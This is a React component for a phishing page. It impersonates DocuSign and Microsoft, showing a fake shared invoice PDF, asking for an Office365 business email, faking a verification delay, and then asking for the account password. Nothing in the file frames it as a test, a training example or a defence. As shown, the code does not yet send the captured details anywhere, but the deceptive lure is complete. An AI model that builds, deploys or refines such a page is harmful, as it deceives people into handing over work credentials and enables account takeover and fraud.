import { useState, useEffect } from "react";

export default function DocuSignForm() {
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPasswordPage, setShowPasswordPage] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setShowPasswordPage(true);
    }, 5000);
  };

  if (showPasswordPage) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-lg w-96 text-center">
          <h2 className="text-xl font-semibold text-blue-600">Verify Password</h2>
          <p className="text-gray-600 mt-2">Email: {email}</p>
          <input
            type="password"
            placeholder="Enter Your Password"
            className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mt-4"
            required
          />
          <button
            className="w-full mt-4 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
          >
            Submit
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg w-96 text-center">
        <img src="/microsoft-logo.png" alt="Microsoft" className="mx-auto mb-4 w-24" />
        <h2 className="text-xl font-semibold text-blue-600">Docu Sign</h2>
        <p className="text-gray-600 mt-2">You've received a secure link to:</p>
        <div className="flex items-center justify-center gap-2 my-3">
          <img src="/pdf-icon.png" alt="PDF" className="w-6 h-6" />
          <span className="text-gray-800 font-medium">INV007209.pdf</span>
        </div>
        <p className="text-sm text-gray-500">To open this secure link, enter the Office365 email this document was shared with.</p>
        <form onSubmit={handleSubmit} className="mt-4">
          <input
            type="email"
            placeholder="Enter Your Business Email"
            className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <button
            type="submit"
            className="w-full mt-4 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 disabled:bg-gray-400"
            disabled={loading}
          >
            {loading ? "Verifying..." : "Next"}
          </button>
        </form>
      </div>
    </div>
  );
}
